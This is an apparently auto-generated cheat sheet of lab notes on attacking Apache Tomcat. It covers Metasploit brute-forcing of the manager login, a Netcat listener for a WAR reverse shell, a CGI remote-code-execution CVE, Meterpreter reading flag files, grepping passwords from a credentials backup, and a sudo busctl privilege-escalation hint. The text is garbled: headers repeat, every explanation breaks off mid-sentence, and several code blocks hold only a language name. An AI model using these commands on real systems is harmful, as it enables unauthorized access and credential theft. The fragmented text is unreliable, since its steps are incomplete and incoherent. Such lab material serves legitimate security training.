# Tomcat

% tomcat, web, cpts

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - discoveryfootprinting
#cat/ATTACK #cpts
This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.

```
├── bin
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - discoveryfootprinting-2
#cat/ATTACK #cpts
The `bin` folder stores scripts and binaries needed to start and run a Tomcat server. The `conf` folder stores various configuration files used by Tomcat. The `tomcat-users.xml` file stores user credentials and their ass

```
webapps/customapp
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - discoveryfootprinting-3
#cat/ATTACK #cpts
The `web.xml` configuration above defines a new servlet named `AdminServlet` that is mapped to the class `com.inlanefreight.api.AdminServlet`. Java uses the dot notation to create package names, meaning the path on disk

```
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - tomcat-manager---login-brute-force
#cat/ATTACK #cpts
We first have to set a few options. Again, we must specify the vhost and the target's IP address to interact with the target properly. We should also set `STOP_ON_SUCCESS` to `true` so the scanner stops when we get a suc

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - tomcat-manager---login-brute-force-2
#cat/ATTACK #cpts
As always, we check to make sure everything is set up correctly by `show options`.

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - tomcat-manager---login-brute-force-3
#cat/ATTACK #cpts
We hit `run` and get a hit for the credential pair `tomcat:admin`.

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - tomcat-manager---login-brute-force-4
#cat/ATTACK #cpts
It is important to note that there are many tools available to us as penetration testers. Many exist to make our work more efficient, especially since most penetration tests are "time-boxed" or under strict time constrai

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - tomcat-manager---login-brute-force-5
#cat/ATTACK #cpts
We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses. A quick check of the value in the `Authorization` header for one reques

```
echo YWRtaW46dmFncmFudA== | base64 -d
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - tomcat-manager---war-file-upload
#cat/ATTACK #cpts
Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access. Valid manage

```
java
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - tomcat-manager---war-file-upload-2
#cat/ATTACK #cpts
Start a Netcat listener and click on `/backup` to execute the shell.

```
nc -lnvp 4443
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - attacking-tomcat-cgi
#cat/ATTACK #cpts
* * * `CVE-2019-0232` is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled. An attacker can exploit th

```
http
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - fuzzing-extentions---bat
#cat/ATTACK #cpts
Navigating to the discovered URL at `http://10.129.204.227:8080/cgi/welcome.bat` returns a message:

```
txt
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - obtain-remote-code-execution-on-the-web01inlanefreightlocal8180-tomcat-2
#cat/ATTACK #cpts
Then, students need to click on the recently deployed WAR file so that the reverse-shell session is established:

```
shell-session
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - obtain-remote-code-execution-on-the-web01inlanefreightlocal8180-tomcat-3
#cat/ATTACK #cpts
At last, students need to print out the flag file "tomcat_flag.txt", which is under the directory `/opt/tomcat/apache-tomcat-10.0.10/webapps/`:

```
cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - exploit-the-application-to-obtain-a-shell-and-submit-the-contents-of-t
#cat/ATTACK #cpts
```
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) >
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - exploit-the-application-to-obtain-a-shell-and-submit-the-contents-of-t-2
#cat/ATTACK #cpts
```
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) > cat C:/Users/Administrator/Desktop/flag.txt
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - submit-the-contents-of-flag4txt
#cat/ATTACK #cpts
When visiting `http://STMIP:8080/`, students will find `Tomcat` running: Clicking on `manager webapp`, students will be prompted for credentials: Using the SSH session, students need to hunt for the `Tomcat` credentials

```
cat /etc/tomcat9/tomcat-users.xml.bak | grep "password"
```

## Tomcat - Tomcat - Tomcat - Tomcat - Tomcat - submit-the-contents-of-flag5txt-2
#cat/ATTACK #cpts
```
(root) NOPASSWD: /usr/bin/busctl
```

